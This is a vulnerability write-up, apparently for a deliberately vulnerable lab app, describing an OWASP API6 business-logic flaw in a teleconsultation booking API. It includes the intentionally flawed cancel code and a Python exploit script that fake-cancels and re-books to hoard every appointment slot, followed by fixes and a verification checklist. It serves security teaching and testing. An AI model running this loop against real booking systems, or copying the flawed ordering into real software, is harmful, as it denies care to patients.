---
id: API6:2023
title: Unrestricted Access to Sensitive Business Flows — Teleconsultation Appointment Booking
category: API
status: DONE
severity: High
owasp: API6:2023 — Unrestricted Access to Sensitive Business Flows
cwe: CWE-840 (Business Logic Errors) / CWE-696 (Incorrect Behavior Order) / CWE-799 (Improper Control of Interaction Frequency)
source_docs:
  - stages/01_spec/output/appointments-api6-spec.md
affected_components:
  - cloud_api/careotter/api_server/services/appointment_service.py
  - cloud_api/careotter/api_server/services/database_service.py
  - cloud_api/careotter/api_server/app.py
  - cloud_api/careotter/api_server/templates/appointments.html
verified_date: 2026-06-04
---

# API6 — Unrestricted Access to Sensitive Business Flows (Teleconsultation Booking)

> **OWASP:** API6:2023 — Unrestricted Access to Sensitive Business Flows
> **CWE:** CWE-840 / CWE-696 / CWE-799
> **Severity:** High

> **Toggle.** The vulnerability is wired to the `VULNERABLE` flag, read per-call in
> `appointment_service.py`. The per-patient booking cap (`MAX_ACTIVE_APPOINTMENTS = 2`) is
> **always enforced** on `book`, checked against the denormalized `users.active_appointments`
> counter. The flaw is in **cancellation**: with **`VULNERABLE=0` (secure)** the cancel
> endpoint validates the HTTP method first (POST only) and releases the slot and decrements
> the counter atomically. With **`VULNERABLE=1` (vulnerable)** the counter is decremented
> **before** the method is checked, and only a POST actually frees the slot — so a non-POST
> cancel (DELETE / GET) **lowers the counter while leaving the booking in place**. One patient
> can re-book on the freed-up counter capacity and **hoard every slot past the cap**, denying
> care to everyone else. The slot claim is **atomic in both modes** (`UPDATE … WHERE
> status='open'`), so two patients never double-book — this is a clean API6 **business-flow
> flaw, not a race condition**.

---

## Why It Matters

Some flows are **sensitive by virtue of being a business process** — checkout, signup,
and crucially **reservations**. They are harmful when driven faster or in greater volume
than a human plausibly would, *even by a perfectly authorized user*. OWASP calls this
**Unrestricted Access to Sensitive Business Flows**; its canonical example is a bot that
books up all of a limited reservation resource.

CareOtter offers **teleconsultation appointments**: a cardiologist exposes a small number
of bookable slots, and any patient may book one. A per-patient cap *exists* — but the
**cancel** flow can be tricked into **decrementing a patient's booking counter without
actually releasing the slot**. By repeatedly faking a cancel and re-booking, a single patient
**drains the whole schedule to zero** while never visibly exceeding the cap, so no other
patient can get a consultation — **denial of care**. No auth bug, no money, no race.

> **This is not BFLA, a race, or resource exhaustion.** The flow is *meant* to be reachable
> by any authenticated patient (`@token_required`) — correct. The slot claim is atomic, so
> there is no double-booking race. The harm is monopolising a **business-limited** resource
> (appointment slots), not consuming CPU/RAM (that would be API4). The defect is a
> **business-logic flaw in the cancel flow** — the per-patient quota is enforced against a
> counter that the attacker can desync from reality through the sanctioned cancel path.

---

## The feature

A cloud-only feature in the CareOtter Flask API + SQLite.

### Data (SQLite)
| Table | Purpose |
|-------|---------|
| `appointment_slots` | `clinician`, `specialty`, `slot_time`, `status` (`open`/`booked`), `booked_by` |
| `users.active_appointments` | Denormalized per-patient counter of currently-held bookings |

Seeded scarce: **~8 open slots** across 2 clinicians (e.g. *Dr. Marlowe Pike — Cardiology*,
*Dr. Selma Okafor — Electrophysiology*) over the next few days. With
`MAX_ACTIVE_APPOINTMENTS = 2`, the secure baseline can serve ≥4 patients; with the cap gone,
one patient takes all 8.

> **Cap is counter-based, not a live count.** The per-patient cap is checked against the
> denormalized `users.active_appointments` column — **not** a `COUNT(*)` over
> `appointment_slots`. `book_slot` increments it (`+1`) on a successful claim; `cancel_slot`
> decrements it (`-1`, clamped at 0). In **secure** mode both halves move together (slot
> released *and* counter decremented, atomically), so the counter mirrors reality. In
> **vulnerable** mode the cancel path can decrement the counter **without** releasing the
> slot — an **in-band** desync through the sanctioned endpoint (not an out-of-band edit),
> which is exactly the API6 weakness below.

### Endpoints (`@token_required`, patient) + the page
| Method | Path | Purpose |
|--------|------|---------|
| `GET`  | `/appointments` | Patient booking page (`@web_patient_required`) — linked from the `index.html` nav bar |
| `GET`  | `/api/appointments/slots` | List **open** slots |
| `GET`  | `/api/appointments/mine` | The caller's booked slots |
| `POST` | `/api/appointments/book` `{slot_id}` | Book a slot (cap + atomic claim) |
| `POST` | `/api/appointments/cancel` `{slot_id}` | Release one of the caller's slots |

> The cancel route is **registered for `POST`, `GET` and `DELETE`** so the method check runs
> *inside* the handler (`AppointmentService.cancel`). Only **POST** is the intended method;
> the front-end (`appointments.js`) always cancels via POST. `slot_id` is read from the JSON
> body **or** the query string, so a `GET …/cancel?slot_id=N` reaches the handler too.

Booking rules live in `services/appointment_service.py`: `MAX_ACTIVE_APPOINTMENTS = 2`
(enforced against the `users.active_appointments` counter), plus an atomic slot claim that
prevents double-booking. The cancel ordering is the toggle — see below.

![[api6_appointment_limit.png]]

---

## The vulnerability

The cap on `book` is always on. The weakness is the **order of operations in the cancel
flow** under `VULNERABLE=1`: the per-patient counter is decremented **before** the HTTP
method is validated, and only a `POST` actually releases the slot.

```python
# database_service.cancel_slot(username, slot_id, http_method, vulnerable=True)
# VULNERABLE: decrement the counter BEFORE validating the request method.
conn.execute("UPDATE users SET active_appointments = MAX(active_appointments - 1, 0) "
             "WHERE username = ?", (username,))
conn.commit()
# The endpoint only means to accept POST — but it is checked too late, after
# the counter was already lowered. Non-POST leaves the slot booked.
if http_method != 'POST':
    return {'ok': False, 'error': 'method_not_allowed', 'method': http_method}
# POST path: actually release the slot (owner-only). …
```

A `DELETE` (or `GET …?slot_id=N`) therefore **lowers `users.active_appointments` by one but
leaves the slot `booked_by` the attacker**. The counter — the *only* thing `book` checks —
now under-reports the slots actually held, so the attacker can book again. The atomic
`UPDATE … WHERE status='open'` claim is unchanged, so concurrent bookings of the same slot
still resolve to exactly one winner (no double-booking, no race introduced).

> **Second vector:** a `POST` cancel for a slot the attacker does **not** own also decrements
> the counter *before* the ownership check fails (`not_your_booking`) — same desync, even
> simpler than the method trick.

### Exploit — "fake-cancel and re-book until the schedule is empty"

![[api6_delete_appointment.png]]

The API appears to be unchanged, but the user now has just one appointment in the API's SQLite database. Therefore, they can book another appointment.
![[api6_max_appointment_broken.png]]

If the attacker repeats this process several times in a row, they can book all available appointments, preventing other users from booking any more appointments.
```python
#!/usr/bin/env python3
# A patient with a valid JWT. The book cap (2) is enforced the whole time — we never exceed
# it on paper. The bug is that a non-POST "cancel" frees counter capacity without freeing the slot.
import requests
BASE = "http://localhost:5002"
jwt  = requests.post(f"{BASE}/api/auth/login/patient",
                     json={"username":"john_doe","password":"johnny123"}).json()["token"]
H = {"Authorization": f"Bearer {jwt}"}

def open_slots(): return requests.get(f"{BASE}/api/appointments/slots", headers=H).json()["slots"]
def book(sid):    return requests.post(f"{BASE}/api/appointments/book",
                                       headers={**H, "Content-Type": "application/json"},
                                       json={"slot_id": sid})

mine = [s["id"] for s in open_slots()[:2]]      # fill the cap: counter = 2, holding 2 slots
for sid in mine: book(sid)

while open_slots():                              # drain the rest, two slots at a time on paper
    # fake-cancel one we hold: DELETE drops the counter to 1 but the slot stays ours
    requests.delete(f"{BASE}/api/appointments/cancel",
                    headers={**H, "Content-Type": "application/json"}, json={"slot_id": mine[0]})
    nxt = open_slots()[0]["id"]                  # counter is 1 < cap → re-book is allowed
    book(nxt); mine.append(nxt)

# Every slot is now booked_by john_doe; users.active_appointments still reads ≤ 2.
# A second patient sees an empty schedule → denial of care.
```


### Expected result
- **`VULNERABLE=1`:** a `DELETE`/`GET` cancel returns **405** *but* has already decremented
  the counter, leaving the slot booked. Looping fake-cancel + re-book lets **one** patient end
  up holding **every** slot while `active_appointments` never exceeds the cap; a second
  patient's `/slots` is empty and any `book` returns `slot_taken` → **denial of care**.
- **`VULNERABLE=0`:** the cancel endpoint validates the method first — `DELETE`/`GET` return
  **405 with no state change**; only `POST` releases the slot *and* decrements the counter
  atomically, so the counter can never drift and the cap holds.

### Out of scope (different categories — do not bundle)
- Concurrent bookings of the **same** slot → resolved atomically (no double-booking); a
  TOCTOU race here would be **CWE-362/367**, deliberately avoided. The counter desync is a
  deterministic ordering bug (CWE-696), **not** a timing race.
- Negative / malformed `slot_id` → input validation (BOPLA, API3-family).
- Booking volume as CPU/RAM exhaustion → API4 (this is about a *business-limited* resource).

---

## How It Should Be

Keep the secure controls on (never run with `VULNERABLE=1` in production):
- **Validate the method before any state change** — reject non-`POST` cancels up front (the
  route would restrict to `POST`, or the handler returns 405 *before* touching the counter).
- **Release the slot and decrement the counter atomically** — both in one transaction, so the
  counter can never under-report held slots. (Better still: don't trust a denormalized
  counter for the cap at all — derive it from `appointment_slots`, or reconcile the two.)
- **Per-patient active-booking cap** (`MAX_ACTIVE_APPOINTMENTS`) — one account cannot hold
  the whole schedule. Enforce it against ground truth, not a mutable counter.
- **Atomic slot claim** (always on) — no double-booking.
- Optional hardening: per-source rate limit on `/api/appointments/*`, anti-automation
  (device binding / challenge), and hold-then-confirm with expiry to deter book-and-no-show.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Ordering | Validate the HTTP method (POST-only) **before** any counter/slot mutation | Kill the desync at its source (CWE-696) |
| Integrity | Release slot + decrement counter in one atomic transaction | Counter can never under-report held slots |
| Quota | Per-patient cap derived from / reconciled with `appointment_slots` | Stop one account hoarding the schedule |
| Concurrency | Atomic slot claim (`UPDATE … WHERE status='open'`) | No double-booking |
| Rate / frequency | Rate limit on `/api/appointments/*` | Stop scripted cancel/re-book loops |
| Anti-automation | Device binding / challenge on booking | Raise the cost of automation |

---

## Verification Checklist

- [ ] `GET /appointments` renders for a logged-in patient; the **calendar link is in the
      `index.html` nav bar**.
- [ ] Seeded: open slots across ≥2 clinicians; `/api/appointments/slots` lists them.
- [ ] The cap reads `users.active_appointments`, **not** a `COUNT(*)` over `appointment_slots`
      (desync test: counter=2 with 0 held → `book` blocked; counter=0 with 2 held → `book` allowed).
- [ ] **Secure (`VULNERABLE=0`)**: a 3rd active booking → `booking_limit_reached` (409); a
      `DELETE`/`GET …?slot_id=N` cancel → **405 with no state change** (counter unchanged, slot
      still booked); only `POST` cancel frees the slot and decrements the counter (atomic).
- [ ] **Vulnerable (`VULNERABLE=1`)**: a `DELETE`/`GET` cancel → 405 but **counter drops while
      the slot stays booked**; looping fake-cancel + re-book lets one patient hold **all** slots
      with `active_appointments` ≤ cap; a second patient → `slot_taken` (denial of care). A
      `POST` cancel of a slot you don't own also decrements the counter (second vector).
- [ ] The slot claim stays atomic in both modes (no double-booking introduced).
- [ ] The flow never inspects `role` — patient access is by design (not the bug).

---

## Codebase note — the Health Store (parked)

The earlier **Health Store** purchase feature (`/store`, `store_service.py`,
`wallets`/`products`/`orders`) remains in the codebase, **kept for future reuse**. It is a
second instance of the same API6 category (inventory hoarding via a missing per-patient
quota) and retains its `VULNERABLE` toggle; teleconsultation booking is now the primary,
documented API6 example. If the store is later repurposed, document or retire it in the
same pass.

---

## References

- Spec: `stages/01_spec/output/appointments-api6-spec.md`
- `cloud_api/careotter/api_server/services/appointment_service.py` (`cancel` reads the `VULNERABLE` toggle)
- `cloud_api/careotter/api_server/services/database_service.py` (`appointment_slots`, `users.active_appointments`, `book_slot`, `cancel_slot`)
- `cloud_api/careotter/api_server/app.py` (`/api/appointments/*` — cancel route accepts POST/GET/DELETE)
